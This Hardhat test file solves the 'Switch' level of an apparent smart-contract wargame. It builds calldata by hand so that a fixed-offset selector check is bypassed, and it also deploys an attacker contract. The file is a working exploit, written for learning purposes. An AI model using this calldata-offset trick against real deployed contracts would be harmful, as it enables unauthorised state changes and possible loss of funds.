import { loadFixture } from "@nomicfoundation/hardhat-toolbox/network-helpers";
import { expect } from "chai";
import { TransactionRequest } from "ethers";
import hre from "hardhat";

import { Switch, SwitchFactory, SwitchFactory__factory, Switch__factory } from "../typechain-types";
import { MySwitchAttack, MySwitchAttack__factory } from "../typechain-types";
import { FixtureContext, FixtureLevel, deployEssentials, deployLevel } from "./fixtures";
import { completeLevel } from "./helpers";

describe("29. Switch", function () {
  let context: FixtureContext;
  let level: FixtureLevel<SwitchFactory, Switch>;

  beforeEach(async function () {
    context = await loadFixture(deployEssentials);
    level = await deployLevel(context, SwitchFactory__factory, (address, signer) =>
      Switch__factory.connect(address, signer),
    );
  });

  /*
  Normal Call: Switch.flipSwitch(abi.encodeWithSignature("turnSwitchOn()"))
  Calldata:
    0x30c13ade: selector of flipSwitch(bytes) 
    0x0000000000000000000000000000000000000000000000000000000000000020: offset to the `bytes` parameter area 
    0x0000000000000000000000000000000000000000000000000000000000000004: length of the `bytes` parameter, 4 in this case
    0x76227e1200000000000000000000000000000000000000000000000000000000: data itself, right-padded
  That's why offset 68 is hardcoded in the expression `calldatacopy(selector, 68, 4) // grab function selector from calldata`
  I.e. 4 (selector) + 32 (offset) + 32 (length) = 68

  So we need to have selector of the allowed function, i.e. Switch.turnSwitchOff.selector, at the offset 68
  We'll construct calldata manually:
    0x30c13ade: selector of flipSwitch(bytes)
    0x0000000000000000000000000000000000000000000000000000000000000060: offset to the `bytes` parameter area
    0x0000000000000000000000000000000000000000000000000000000000000000: not used word, it can be anything
    0x20606e1500000000000000000000000000000000000000000000000000000000: hardcoded Switch.turnSwitchOff.selector
    0x0000000000000000000000000000000000000000000000000000000000000004: length of flipSwitch's bytes memory _data parameter
    0x76227e12: data itself, Switch.turnSwitchOn.selector
  */

  it("should be attacked successfully through custom transaction", async function () {
    const payload =
      level.instance.flipSwitch.fragment.selector +
      hre.ethers.zeroPadValue("0x60", 32).slice(2) +
      hre.ethers.zeroPadValue("0x112233", 32).slice(2) +
      hre.ethers.zeroPadBytes(level.instance.turnSwitchOff.fragment.selector, 32).slice(2) +
      hre.ethers.zeroPadValue("0x04", 32).slice(2) +
      hre.ethers.zeroPadBytes(level.instance.turnSwitchOn.fragment.selector, 32).slice(2);

    const txreq: TransactionRequest = {
      to: await level.instance.getAddress(),
      from: context.player.address,
      data: payload,
    };

    expect(await level.instance.switchOn()).to.be.false;

    const tx = await context.player.sendTransaction(txreq);
    await expect(tx).to.be.not.reverted;
    await tx.wait();

    expect(await level.instance.switchOn()).to.be.true;
    await completeLevel(context, level);
  });

  it("should be attacked successfully through attacker contract", async function () {
    expect(await level.instance.switchOn()).to.be.false;

    // deploy attacker contract
    const attackFactory: MySwitchAttack__factory = new MySwitchAttack__factory(context.player);
    const attackContract: MySwitchAttack = await attackFactory.deploy(level.instance);
    await attackContract.waitForDeployment();

    expect(await level.instance.switchOn()).to.be.true;
    await completeLevel(context, level);
  });
});
